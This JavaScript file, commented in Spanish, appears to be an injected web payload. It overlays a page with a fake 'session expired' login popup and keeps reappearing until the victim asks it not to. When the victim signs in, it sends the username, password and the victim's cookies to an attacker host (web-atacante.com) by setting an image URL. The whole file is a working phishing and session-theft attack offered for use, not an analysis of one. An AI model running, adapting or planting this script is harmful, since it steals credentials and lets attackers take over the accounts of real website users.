// Incluimos las librerias para que funcione el popup.
// Source popup: https://w2ui.com/web/docs/2.0/
// 

var libreria = document.createElement('link');
libreria.rel = 'stylesheet';
libreria.href='https://w2ui.com/src/w2ui-1.5.min.css';
document.getElementsByTagName('head')[0].appendChild(libreria); 

libreria = document.createElement('script');
libreria.src='https://w2ui.com/src/w2ui-1.5.min.js';
document.getElementsByTagName('head')[0].appendChild(libreria); 

libreria = document.createElement('script');
libreria.src='https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js';
document.getElementsByTagName('head')[0].appendChild(libreria); 



// Cuando carge la pagina, a los 5 segundos le salta el formulario del login
setTimeout(payload, 1000);

// Estructura html del login, totalmente modificable
function payload() {
    w2popup.open({
    	width: 400,
    	height: 300,
        title: '<div style="">Your session has expired</div>',
        body: '<div class="w2ui-centered" style="position:static; margin-top:20%">\
        Your session has expired for security.<br>Please try signing in again</div>\
        <div style="margin-left:17%">\
        <table>\
        	<tr>\
        		<td>Username:</td>\
        		<td><input type="text" id="username" name="user" class="user"></td>\
        	</tr>\
        	<tr>\
        		<td>Password:</td>\
        		<td><input type="password" id="password" name="pass" class="pass"></td>\
        	</tr>\
        	<tr>\
        		<td><input type="checkbox" id="preguntacheck" style="float: right"></td>\
                <td>Do not expire the session</td>\
        	</tr>\
        </table>\
        </div>',
        buttons: '<div id="error_login" style="visibility:hidden">El usuario o la contraseña no son correctas. Intentelo de nuevo</div>\
                  <button class="btn" onclick="boton_login()">Login</button>'
    });
}

function boton_login() {
    // Mete en las valiables las credenciales 
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    // Si las variables tienen valor ejecuta el script de lo contrario saca error
    if (username && password) {
        // Si el usuario no quiere que le pregunten de nuevo no saldrá otro popup
        if (preguntacheck.checked == true){
            var dontaskpopup="1"
            w2popup.close()
        } else {
            var dontaskpopup="0"
            // El usuario no ha pulsado el boton, el formulario le saldrá de nuevo en 25 segundos
            w2popup.close()
            setTimeout(payload, 25000);
        }
        // Exfiltra las credenciales mediante GET usando el src de un tag imagen
        // Envia en la request de la imagen los parametros, que recogen el valor de las variables anteriores + la cookie actual del usuario
        var i=new Image;
        // Aqui viene la url del atacante donde se van a exfiltrar las credenciales.
        i.src=`http://web-atacante.com/?cookie=${document.cookie}&user=${username}&pass=${password}&dontaskpopup=${dontaskpopup}`;
     
    } else {
        // Muestra el error oculto del login
        document.getElementById("error_login").style="visibility:visible;color:red;";
    }
}

